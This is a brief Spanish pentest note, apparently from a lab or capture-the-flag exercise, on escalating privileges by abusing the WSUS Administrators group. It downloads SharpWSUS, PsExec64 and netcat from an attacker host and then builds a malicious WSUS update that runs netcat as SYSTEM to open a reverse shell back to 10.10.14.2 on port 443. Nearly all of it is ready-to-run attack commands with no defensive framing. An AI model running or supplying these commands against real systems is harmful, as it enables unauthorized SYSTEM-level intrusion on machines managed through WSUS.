# Privesc

## Abuso del grupo WSUS Administrator

### Archivos necesarios
```null
iwr -uri http://10.10.14.2/SharpWSUS.exe -o SharpWSUS.exe
iwr -uri http://10.10.14.2/PsExec64.exe -o PsExec64.exe
iwr -uri http://10.10.14.2/nc.exe -o nc.exe
```

### Reverse Shell
```null
.\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

